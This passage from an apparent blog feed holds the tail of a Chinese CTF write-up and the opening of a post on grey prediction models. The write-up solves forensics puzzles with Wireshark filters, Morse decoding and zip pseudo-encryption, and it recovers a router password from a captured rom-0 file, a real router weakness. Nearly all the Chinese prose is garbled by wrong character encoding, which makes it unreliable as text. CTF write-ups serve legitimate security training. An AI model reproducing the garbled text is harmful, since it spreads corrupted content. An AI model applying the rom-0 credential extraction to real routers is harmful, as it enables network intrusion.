title="Misc2-Êñá‰ª∂Á±ªÂûãÂàÜÊûê"></a>Misc2-Êñá‰ª∂Á±ªÂûãÂàÜÊûê</h3><blockquote><p>ÂæóÂà∞‰∏Ä‰∏™zipÂéãÁº©ÂåÖÔºåÁÇπÂºÄÊù•ÁúãÁúãÔºåÂ≠òÂú®[content-types].xmlÊñá‰ª∂ÔºåÂü∫Êú¨‰∏äÂèØ‰ª•Á°ÆÂÆöÊòØÂæÆËΩØÂÖ¨Âè∏officeÂ•ó‰ª∂ÁöÑÊ†ºÂºè„ÄÇÁÆÄÂçïËØïËøádocÔºådocxÔºåpptÔºåpptxÔºåxlsÔºåxlxsÊ≤°Áî®‰πãÂêéÔºåÊü•Âà∞xpsÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5e705b81e3.png" class="lazyload"></p><p>‰∫éÊòØÊîπ‰∏∫xpsÊñá‰ª∂ÂêéÁºÄÂç≥ÂèØÔºåÂ∞ÜxpsÊèê‰∫§„ÄÇ</p></blockquote><h3 id="Misc3-ÁúüÁúüÂÅáÂÅáÂàÜ‰∏çÊ∏ÖÊ•ö"><a href="#Misc3-ÁúüÁúüÂÅáÂÅáÂàÜ‰∏çÊ∏ÖÊ•ö" class="headerlink" title="Misc3-ÁúüÁúüÂÅáÂÅáÂàÜ‰∏çÊ∏ÖÊ•ö"></a>Misc3-ÁúüÁúüÂÅáÂÅáÂàÜ‰∏çÊ∏ÖÊ•ö</h3><blockquote><p>ÁÆÄÂçïÁöÑ‰∏Ä‰∏™‰º™Âä†ÂØÜÔºå‰øÆÊîπÂÖ®Â±ÄÂä†ÂØÜÊ†áÂøó‰ΩçÔºåÂ∞ÜÂ•áÊï∞Êîπ‰∏∫ÂÅ∂Êï∞Âç≥ÂèØ„ÄÇ</p><p>{FLAG:011938d495c36aeab4bfbd897c240d31}</p></blockquote><h3 id="Misc4-ËØ±‰∫∫ÁöÑÈü≥‰πê"><a href="#Misc4-ËØ±‰∫∫ÁöÑÈü≥‰πê" class="headerlink" title="Misc4-ËØ±‰∫∫ÁöÑÈü≥‰πê"></a>Misc4-ËØ±‰∫∫ÁöÑÈü≥‰πê</h3><blockquote><p>ËøôÈ¢òÁöÑÈü≥È¢ëÊñá‰ª∂‰∏≠Â≠òÂú®‰∏ÄÊÆµÊë©ÊñØÁîµÁ†ÅÔºàÊúâÁöÑÂêåÂ≠¶ÈÄöËøá‰∫åËøõÂà∂getflagÔºâÔºåÈÄöËøáÈü≥È¢ëÂàÜÊûêËΩØ‰ª∂ÂèØ‰ª•Â∞ÜÂÖ∂ÊèêÂèñÂá∫Êù•Ôºö</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token comment" spellcheck="true">#‰∏ÄÊ¨°ÊÄßËß£Á†ÅË°å‰∏çÈÄöÔºåÂèØ‰ª•Â∞ÜÂÖ∂ÂàÜ‰∏∫‰∏âÊÆµÂàÜÂà´Ëß£Á†ÅÂπ∂‰∏îÂ∞Ü‰∏â‰∏™ÈùûÊ≠£Â∏∏Â≠óÁ¨¶ËΩ¨‰∏∫16ËøõÂà∂Ôºö</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Êô¨<span class="token number">61677b6368</span>Êô¨ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x666c</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>„Ö∞<span class="token number">74756e65</span>„Ö∞ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x3170</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>Âºµ<span class="token number">337665727c</span>Âºµ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x5f35</span><span class="token comment" spellcheck="true">#ËøõË°åÊãºÊé•</span><span class="token number">666c61677b6368317074756e655f35337665727c</span><span class="token comment" spellcheck="true">#ÂèØ‰ª•ÂæóÂà∞</span>flag<span class="token punctuation">{</span>ch1ptune_53ver<span class="token operator">|</span><span class="token comment" spellcheck="true">#Êèê‰∫§ch1ptune_53verÂç≥ÂèØ</span></code></pre><h3 id="Misc5-Á•ûÁßòÁöÑÊñá‰ª∂Âêç-Êú™Ëß£Âá∫"><a href="#Misc5-Á•ûÁßòÁöÑÊñá‰ª∂Âêç-Êú™Ëß£Âá∫" class="headerlink" title="Misc5-Á•ûÁßòÁöÑÊñá‰ª∂Âêç(Êú™Ëß£Âá∫)"></a>Misc5-Á•ûÁßòÁöÑÊñá‰ª∂Âêç(Êú™Ëß£Âá∫)</h3><blockquote><p> ÂèØ‰ª•ÈÄöËøábinwalkÂæóÂà∞‰∏Ä‰∏™ÈÄÜÂêëÈ¢òÔºåËæÉÈöæÔºåÊú™Ëß£Âá∫„ÄÇ</p></blockquote><h2 id="ÁΩëÁªúÂçèËÆÆÂàÜÊûê"><a href="#ÁΩëÁªúÂçèËÆÆÂàÜÊûê" class="headerlink" title="ÁΩëÁªúÂçèËÆÆÂàÜÊûê"></a>ÁΩëÁªúÂçèËÆÆÂàÜÊûê</h2><h3 id="ÁΩëÁªúÂçèËÆÆÂàÜÊûê1-Êï∞ÊçÆÂåÖÈáåÊúâÁîúÁîúÂúàÂì¶"><a href="#ÁΩëÁªúÂçèËÆÆÂàÜÊûê1-Êï∞ÊçÆÂåÖÈáåÊúâÁîúÁîúÂúàÂì¶" class="headerlink" title="ÁΩëÁªúÂçèËÆÆÂàÜÊûê1-Êï∞ÊçÆÂåÖÈáåÊúâÁîúÁîúÂúàÂì¶~"></a>ÁΩëÁªúÂçèËÆÆÂàÜÊûê1-Êï∞ÊçÆÂåÖÈáåÊúâÁîúÁîúÂúàÂì¶~</h3><blockquote><p>wiresharkÊâìÂºÄÊï∞ÊçÆÂåÖÂêéÔºå‰æùÊ¨°‰ΩøÁî®‰ª•‰∏ãËøáÊª§ËßÑÂàô:<br><code>http contains flag</code></p><p><code>tcp contains flag</code></p><p><code>udp contains flag</code></p><p>Âç≥ÂèØÈÄöËøá<code>udp contains flag</code>Êü•Âà∞flag„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5eaff1fee2.png" class="lazyload"></p></blockquote><h3 id="ÁΩëÁªúÂçèËÆÆÂàÜÊûê2-ÂòøÂòøÂòø-Êú™Ëß£Âá∫"><a href="#ÁΩëÁªúÂçèËÆÆÂàÜÊûê2-ÂòøÂòøÂòø-Êú™Ëß£Âá∫" class="headerlink" title="ÁΩëÁªúÂçèËÆÆÂàÜÊûê2-ÂòøÂòøÂòø(Êú™Ëß£Âá∫)"></a>ÁΩëÁªúÂçèËÆÆÂàÜÊûê2-ÂòøÂòøÂòø(Êú™Ëß£Âá∫)</h3><blockquote><p>ÁªèËøáÁñØÁãÇÊâãÂä®ÊèêÂèñÂêéÂèëÁé∞Âè™ËÉΩËé∑Âæó‰∏Ä‰∏ùÂõæÁâáÔºåËµõÂêéÂæóÁü•ÈúÄË¶ÅÁî®<strong>tcpflow</strong>Ëøô‰∏™Á•ûÂô®ÈáçÊûÑÊçüÂÆ≥ÁöÑtcpÊï∞ÊçÆÔºå‰ªéËÄåÂæóÂà∞ÂõæÂÉè„ÄÇ</p></blockquote><h3 id="ÁΩëÁªúÂçèËÆÆÂàÜÊûê3-thief"><a href="#ÁΩëÁªúÂçèËÆÆÂàÜÊûê3-thief" class="headerlink" title="ÁΩëÁªúÂçèËÆÆÂàÜÊûê3-thief"></a>ÁΩëÁªúÂçèËÆÆÂàÜÊûê3-thief</h3><blockquote><p>ÊãøÂà∞Êï∞ÊçÆÂåÖÊâìÂºÄÂêéÂèëÁé∞Â§ßÈÉ®ÂàÜÈÉΩÊòØ<code>802.11 wlan</code>Êï∞ÊçÆÂåÖÔºåËøáÊª§‰∏Ä‰∏ãhttpËØ∑Ê±ÇÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ebef87b2d.png" class="lazyload"></p><p>ÂèØ‰ª•ÂèëÁé∞Á¨¨‰∏Ä‰∏™ËØ∑Ê±ÇÁöÑÊòØ<code>/rom-0</code>ÔºåÁ°ÆÂÆû‰∏çÁü•‰∏∫‰ΩïÂ∞±ËßâÂæóËøô‰∏™ÊòØÂÖ≥ÈîÆÔºågoogleÊêúÁ¥¢‰∏Ä‰∏ãÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ed05ddbaa.png" class="lazyload"></p><p>ÁÇπËøõrouterPwnÂèëÁé∞ÊòØ‰∏Ä‰∏™Ëß£Âéãrom-0Êñá‰ª∂ÁöÑÁΩëÂùÄÔºåÈÇ£Êàë‰ª¨ÊòØ‰∏çÊòØËøòÁº∫‰∏Ä‰∏™Êñá‰ª∂„ÄÇÊé•‰∏ãÊù•ÈÄöËøáÂØºÂá∫httpÂØπË±°ÔºåÊàë‰ª¨ÂèØ‰ª•ÂæóÂà∞‰∏Ä‰∏™rom0Êñá‰ª∂ÔºåÊ≠£Â•ΩÂ∞ÜÂÖ∂Ëß£ÂØÜÂæóÂà∞‰ª•‰∏ãÂÜÖÂÆπÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ÁåúÊµãÊòØÁî®Êù•Ëß£ÂØÜÁöÑÂØÜÈí•ÂíØ</span>Rome4040TP<span class="token operator">-</span>LINKpublicpublicpublicpublic</code></pre><p>Âú®ËøêÁî®wiresharkÂàÜÊûêÊµÅÈáèÁöÑËøáÁ®ã‰∏≠Êàë‰ª¨ÁªèÂ∏∏ÈúÄË¶Å‰ΩøÁî®ÂØÜÈí•‰πãÁ±ªÁöÑ‰∏úË•øÊù•Ëß£ÂØÜÊµÅÈáèÔºåÊ≠§Â§ÑÂêåÊ†∑ÈÄöËøá <a href="https://blog.csdn.net/neal_hddnwpu/article/details/82586235?utm_source=blogxgwz2" target="_blank" rel="noopener">Êü•ËØ¢ËµÑÊñô</a> ÂèØ‰ª•Ëé∑ÂæóËß£ÂØÜÊñπÂºèÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5eefeb803c.png" class="lazyload"></p><p>Â∞ÜÂØÜÁ†ÅRome4040ÂØºÂÖ•Ëß£ÂØÜÔºåÂèØ‰ª•ÂèëÁé∞ÁöÑÁ°ÆÂá∫Áé∞‰∫Ü<strong>ÂæàÂ§öhttpÂíåtcpÁöÑÂåÖ</strong>ÔºåÊ†πÊçÆÈ¢òÁõÆÊèêÁ§∫‰ΩøÁî®ËøáÊª§<code>http contains CTF</code>ÂæóÂà∞flagÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ef72cfc64.png" class="lazyload"></p></blockquote><blockquote><p>üÜíwandoucup-CTF-WPÂà∞Ê≠§ÁªìÊùü„ÄÇ</p><p>Publish by Yof3ngüëå„ÄÇ</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> ÊµÅÈáèÂàÜÊûê </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ÁÅ∞Ëâ≤È¢ÑÊµã</title>
      <link href="/2018/10/27/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/"/>
      <url>/2018/10/27/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ÁÅ∞Ëâ≤È¢ÑÊµãÔºàGrey-modelÔºâ"><a href="#ÁÅ∞Ëâ≤È¢ÑÊµãÔºàGrey-modelÔºâ" class="headerlink" title="ÁÅ∞Ëâ≤È¢ÑÊµãÔºàGrey modelÔºâ"></a>ÁÅ∞Ëâ≤È¢ÑÊµãÔºàGrey modelÔºâ</h1><blockquote><p>ÁÆÄÂçï‰∫ÜËß£‰∏Ä‰∏ãÁÅ∞Ëâ≤È¢ÑÊµãËøôÁé©ÊÑèÂÑø„ÄÇhahaüôÇ</p></blockquote><h2 id="‰ªÄ‰πàÊòØÁÅ∞Ëâ≤È¢ÑÊµãÔºü"><a href="#‰ªÄ‰πàÊòØÁÅ∞Ëâ≤È¢ÑÊµãÔºü" class="headerlink" title="‰ªÄ‰πàÊòØÁÅ∞Ëâ≤È¢ÑÊµãÔºü"></a>‰ªÄ‰πàÊòØÁÅ∞Ëâ≤È¢ÑÊµãÔºü</h2><blockquote><p>ÁÅ∞Ëâ≤ÁêÜËÆ∫Ôºö</p><p>ÈÄöËøáÂØπÂéüÂßãÊï∞ÊçÆÁöÑÂ§ÑÁêÜÊåñÊéòÁ≥ªÁªüÂèòÂä®ËßÑÂæãÔºåÂª∫Á´ãÁõ∏Â∫îÂæÆÂàÜÊñπÁ®ãÔºå‰ªéËÄåÈ¢ÑÊµã‰∫ãÁâ©Êú™Êù•ÂèëÂ±ïÁä∂ÂÜµ„ÄÇ </p><ul><li>‰ºòÁÇπÔºöÂØπ‰∫é‰∏çÁ°ÆÂÆöÂõ†Á¥†ÁöÑÂ§çÊùÇÁ≥ªÁªüÈ¢ÑÊµãÊïàÊûúËæÉÂ•ΩÔºå‰∏îÊâÄÈúÄÊ†∑Êú¨Êï∞ÊçÆËæÉÂ∞èÔºõ </li><li>Áº∫ÁÇπÔºöÂü∫‰∫éÊåáÊï∞ÁéáÁöÑÈ¢ÑÊµãÊ≤°ÊúâËÄÉËôëÁ≥ªÁªüÁöÑÈöèÊú∫ÊÄßÔºå‰∏≠ÈïøÊúüÈ¢ÑÊµãÁ≤æÂ∫¶ËæÉÂ∑Æ„ÄÇ</li></ul><p>ÁôæÂ∫¶ÁôæÁßëÊòØËøô‰πàËØ¥ÁöÑÔºö</p><p><a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/7534704" target="_blank" rel="noopener">ÁÅ∞Ëâ≤È¢ÑÊµã</a>ÊòØÂ∞±<a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E7%B3%BB%E7%BB%9F/9595581" target="_blank" rel="noopener">ÁÅ∞Ëâ≤Á≥ªÁªü</a>„ÄêÁÅ∞Ëâ≤Á≥ªÁªüÊòØÊåá‚ÄúÈÉ®ÂàÜ‰ø°ÊÅØÂ∑≤Áü•ÔºåÈÉ®ÂàÜ‰ø°ÊÅØÊú™Áü•‚ÄúÁöÑ‚ÄùÂ∞èÊ†∑Êú¨‚ÄúÔºå‚ÄùË¥´‰ø°ÊÅØ‚ÄúÁöÑ‰∏çÁ°ÆÂÆöÁ≥ªÁªüÔºå‰ª•ÁÅ∞Ëâ≤Ê®°ÂûãÔºàG,MÔºâ‰∏∫Ê†∏ÂøÉÁöÑÊ®°Âûã‰ΩìÁ≥ª„ÄÇ„ÄëÊâÄÂÅöÁöÑÈ¢ÑÊµã„ÄÇÊâÄË∞ìÁÅ∞Ëâ≤Á≥ªÁªüÊòØ‰ªã‰∫éÁôΩËâ≤Á≥ªÁªüÂíåÈªëÁÆ±Á≥ªÁªü‰πãÈó¥ÁöÑËøáÊ∏°Á≥ªÁªü„ÄÇÂÖ∂ÂÖ∑‰ΩìÁöÑÂê´‰πâÊòØ:Â¶ÇÊûúÊüê‰∏ÄÁ≥ªÁªüÁöÑÂÖ®ÈÉ®‰ø°ÊÅØÂ∑≤Áü•‰∏∫ÁôΩËâ≤Á≥ªÁªüÔºåÂÖ®ÈÉ®‰ø°ÊÅØÊú™Áü•‰∏∫ÈªëÁÆ±Á≥ªÁªüÔºåÈÉ®ÂàÜ‰ø°ÊÅØÂ∑≤Áü•ÔºåÈÉ®ÂàÜ‰ø°ÊÅØÊú™Áü•ÔºåÈÇ£‰πàËøô‰∏ÄÁ≥ªÁªüÂ∞±ÊòØÁÅ∞Ëâ≤Á≥ªÁªü„ÄÇ</p></blockquote><h2 id="ÈÇ£‰πà‰ªÄ‰πàÂèàÊòØÁÅ∞Ëâ≤È¢ÑÊµãÊ≥ïÂë¢Ôºü"><a href="#ÈÇ£‰πà‰ªÄ‰πàÂèàÊòØÁÅ∞Ëâ≤È¢ÑÊµãÊ≥ïÂë¢Ôºü" class="headerlink" title="ÈÇ£‰πà‰ªÄ‰πàÂèàÊòØÁÅ∞Ëâ≤È¢ÑÊµãÊ≥ïÂë¢Ôºü"></a>ÈÇ£‰πà‰ªÄ‰πàÂèàÊòØÁÅ∞Ëâ≤È¢ÑÊµãÊ≥ïÂë¢Ôºü</h2><blockquote><p>‰∏ÄËà¨Âú∞ËØ¥Ôºå<a href="https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">Á§æ‰ºöÁ≥ªÁªü</a>„ÄÅ<a href="https://baike.baidu.com/item/%E7%BB%8F%E6%B5%8E%E7%B3%BB%E7%BB%9F/3897147" target="_blank" rel="noopener">ÁªèÊµéÁ≥ªÁªü</a>„ÄÅÁîüÊÄÅÁ≥ªÁªüÈÉΩÊòØÁÅ∞Ëâ≤Á≥ªÁªü„ÄÇ‰æãÂ¶ÇÁâ©‰ª∑Á≥ªÁªüÔºåÂØºËá¥Áâ©‰ª∑‰∏äÊ∂®ÁöÑÂõ†Á¥†ÂæàÂ§öÔºå‰ΩÜÂ∑≤Áü•ÁöÑÂç¥‰∏çÂ§öÔºåÂõ†Ê≠§ÂØπÁâ©‰ª∑Ëøô‰∏ÄÁÅ∞Ëâ≤Á≥ªÁªüÁöÑÈ¢ÑÊµãÂèØ‰ª•Áî®ÁÅ∞Ëâ≤È¢ÑÊµãÊñπÊ≥ï„ÄÇ</p></blockquote><h2 id="ÁÅ∞Ëâ≤Ê®°ÂûãÁöÑÂ∫îÁî®"><a href="#ÁÅ∞Ëâ≤Ê®°ÂûãÁöÑÂ∫îÁî®" class="headerlink" title="ÁÅ∞Ëâ≤Ê®°ÂûãÁöÑÂ∫îÁî®"></a>ÁÅ∞Ëâ≤Ê®°ÂûãÁöÑÂ∫îÁî®</h2><blockquote><p>1„ÄÅÊï∞ÂàóÈ¢ÑÊµã„ÄÇÂØπÊüêÁé∞Ë±°ÈöèÊó∂Èó¥ÁöÑÈ°∫Âª∂ËÄåÂèëÁîüÁöÑÂèòÂåñÊâÄÂÅöÁöÑÈ¢ÑÊµãÂÆö‰πâ‰∏∫Êï∞ÂàóÈ¢ÑÊµã„ÄÇ‰æãÂ¶ÇÂØπ<a href="https://baike.baidu.com/item/%E6%B6%88%E8%B4%B9%E7%89%A9%E4%BB%B7%E6%8C%87%E6%95%B0" target="_blank" rel="noopener">Ê∂àË¥πÁâ©‰ª∑ÊåáÊï∞</a>ÁöÑÈ¢ÑÊµãÔºåÈúÄË¶ÅÁ°ÆÂÆö‰∏§‰∏™ÂèòÈáèÔºå‰∏Ä‰∏™ÊòØÊ∂àË¥πÁâ©‰ª∑ÊåáÊï∞ÁöÑÊ∞¥Âπ≥„ÄÇÂè¶‰∏Ä‰∏™ÊòØËøô‰∏ÄÊ∞¥Âπ≥ÊâÄÂèëÁîüÁöÑÊó∂Èó¥„ÄÇ</p><p>2„ÄÅÁÅæÂèòÈ¢ÑÊµã„ÄÇÂØπÂèëÁîüÁÅæÂÆ≥ÊàñÂºÇÂ∏∏Á™ÅÂèòÊó∂Èó¥ÂèØËÉΩÂèëÁîüÁöÑÊó∂Èó¥È¢ÑÊµãÁß∞‰∏∫ÁÅæÂèòÈ¢ÑÊµã„ÄÇ‰æãÂ¶ÇÂØπÂú∞ÈúáÊó∂Èó¥ÁöÑÈ¢ÑÊµã„ÄÇ</p><p>3„ÄÅÂ≠£ËäÇÊÄßÁÅæÂèòÈ¢ÑÊµã„ÄÇÂØπÂèëÁîüÂú®ÊØèÂπ¥ÁâπÂÆöÊó∂Âå∫ÁöÑ‰∫ã‰ª∂ÊàñÂëΩÈ¢ò‰ΩúÁÅ∞È¢ÑÊµãÔºåÁß∞Â≠£ËäÇÁÅæÂèòÁÅ∞È¢ÑÊµã„ÄÇ</p><p>4„ÄÅÊãìÊâëÈ¢ÑÊµã„ÄÇÂ∞ÜÂéüÂßãÊï∞ÊçÆ‰ΩúÊõ≤Á∫øÔºåÂú®Êõ≤Á∫ø‰∏äÊåâÂÆöÂÄºÂØªÊâæËØ•ÂÆöÂÄºÂèëÁîüÁöÑÊâÄÊúâ<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9" target="_blank" rel="noopener">Êó∂ÁÇπ</a>ÔºåÂπ∂‰ª•ËØ•ÂÆöÂÄº‰∏∫Ê°ÜÊû∂ÊûÑÊàê<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9%E6%95%B0%E5%88%97" target="_blank" rel="noopener">Êó∂ÁÇπÊï∞Âàó</a>ÔºåÁÑ∂ÂêéÂª∫Á´ãÊ®°ÂûãÈ¢ÑÊµãÊú™Êù•ËØ•ÂÆöÂÄºÊâÄÂèëÁîüÁöÑÊó∂ÁÇπ„ÄÇ</p><p>5„ÄÅ<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E9%A2%84%E6%B5%8B/12609292" target="_blank" rel="noopener">Á≥ªÁªüÈ¢ÑÊµã</a>„ÄÇÂØπÁ≥ªÁªü‰∏≠‰ºóÂ§öÂèòÈáèÈó¥Áõ∏‰∫íÂçèË∞ÉÂÖ≥Á≥ªÁöÑÂèëÂ±ïÂèòÂåñÊâÄËøõË°åÁöÑÈ¢ÑÊµãÁß∞‰∏∫Á≥ªÁªüÈ¢ÑÊµã„ÄÇ‰æãÂ¶ÇÂ∏ÇÂú∫‰∏≠<a href="https://baike.baidu.com/item/%E6%9B%BF%E4%BB%A3%E5%95%86%E5%93%81" target="_blank" rel="noopener">Êõø‰ª£ÂïÜÂìÅ</a>„ÄÅÁõ∏‰∫íÂÖ≥ËÅîÂïÜÂìÅ<a href="https://baike.baidu.com/item/%E9%94%80%E5%94%AE%E9%87%8F" target="_blank" 